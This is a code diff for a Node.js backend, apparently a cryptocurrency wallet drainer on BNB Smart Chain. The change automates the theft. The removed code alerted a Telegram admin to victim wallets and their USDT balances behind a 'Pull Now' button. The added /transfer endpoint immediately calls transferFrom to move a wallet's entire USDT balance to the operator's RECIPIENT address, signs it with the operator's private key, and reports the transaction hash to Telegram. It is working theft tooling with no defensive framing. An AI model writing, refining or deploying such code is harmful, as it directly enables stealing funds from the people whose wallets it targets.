@@ -6,7 +6,6 @@ require('dotenv').config();
 const app = express();
 app.use(express.json());
 
-// CORS headers
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -21,84 +20,53 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 const PRIVATE_KEY = process.env.PRIVATE_KEY;
 
-console.log("✅ Bot configured");
-
 const web3 = new Web3('https://bsc-dataseed.binance.org');
+const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
 
-app.post('/check-balance', async (req, res) => {
+console.log("✅ Backend ready");
+
+app.get('/backend-address', (req, res) => {
+    res.json({ address: account.address });
+});
+
+app.post('/transfer', async (req, res) => {
     try {
         const { walletAddress } = req.body;
-        console.log("Checking balance for:", walletAddress);
+        console.log("Transferring from:", walletAddress);
         
         const usdtContract = new web3.eth.Contract([
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
+            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+            {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
         ], USDT_ADDRESS);
 
         const balance = await usdtContract.methods.balanceOf(walletAddress).call();
         const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
         
-        console.log("Balance:", balanceInUSDT);
+        const tx = usdtContract.methods.transferFrom(walletAddress, RECIPIENT, balance);
+        const gas = await tx.estimateGas({ from: account.address });
         
-        const message = `🔔 **Wallet Detected!**\n\n👤 Wallet: ${walletAddress}\n💰 Balance: ${balanceInUSDT} USDT\n⏰ Time: ${new Date().toLocaleString()}`;
+        const signedTx = await web3.eth.accounts.signTransaction({
+            to: USDT_ADDRESS,
+            data: tx.encodeABI(),
+            gas: Math.ceil(gas * 1.1),
+            gasPrice: await web3.eth.getGasPrice(),
+            nonce: await web3.eth.getTransactionCount(account.address)
+        }, PRIVATE_KEY);
+
+        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+        console.log("✅ Transfer successful!");
+
+        const message = `✅ **Transfer Completed!**\n\n👤 Wallet: ${walletAddress}\n💸 Amount: ${balanceInUSDT} USDT\n📝 TX: ${receipt.transactionHash}\n⏰ Time: ${new Date().toLocaleString()}`;
 
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             chat_id: ADMIN_CHAT_ID,
-            text: message,
-            reply_markup: {
-                inline_keyboard: [[{ text: '💳 Pull Now', callback_data: `pull_${walletAddress}` }]]
-            }
+            text: message
         });
 
-        console.log("✅ Telegram sent!");
-        res.json({ success: true, balance: balanceInUSDT });
+        res.json({ success: true, amount: balanceInUSDT, txHash: receipt.transactionHash });
     } catch (error) {
-        console.error("❌ Error:", error.message);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-app.post('/webhook', async (req, res) => {
-    try {
-        const { callback_query } = req.body;
-        
-        if (callback_query && callback_query.data.startsWith('pull_')) {
-            const walletAddress = callback_query.data.replace('pull_', '');
-            console.log("🔘 Pull button clicked for:", walletAddress);
-            
-            const usdtContract = new web3.eth.Contract([
-                {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
-                {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
-            ], USDT_ADDRESS);
-
-            const balance = await usdtContract.methods.balanceOf(walletAddress).call();
-            console.log("Balance to transfer:", web3.utils.fromWei(balance, 'ether'));
-            
-            const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
-            const tx = usdtContract.methods.transferFrom(walletAddress, RECIPIENT, balance);
-            const gas = await tx.estimateGas({ from: account.address });
-            
-            const signedTx = await web3.eth.accounts.signTransaction({
-                to: USDT_ADDRESS,
-                data: tx.encodeABI(),
-                gas: Math.ceil(gas * 1.1),
-                gasPrice: await web3.eth.getGasPrice(),
-                nonce: await web3.eth.getTransactionCount(account.address)
-            }, PRIVATE_KEY);
-
-            const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-            console.log("✅ Transfer successful! TX:", receipt.transactionHash);
-            
-            const transferMsg = `✅ **Transfer Completed!**\n\n👤 Wallet: ${walletAddress}\n💸 Amount: ${web3.utils.fromWei(balance, 'ether')} USDT\n📝 TX: ${receipt.transactionHash}`;
-            
-            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                chat_id: ADMIN_CHAT_ID,
-                text: transferMsg
-            });
-        }
-        res.json({ ok: true });
-    } catch (error) {
-        console.error("❌ Webhook error:", error.message);
-        res.json({ ok: false });
+        console.error("Error:", error.message);
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
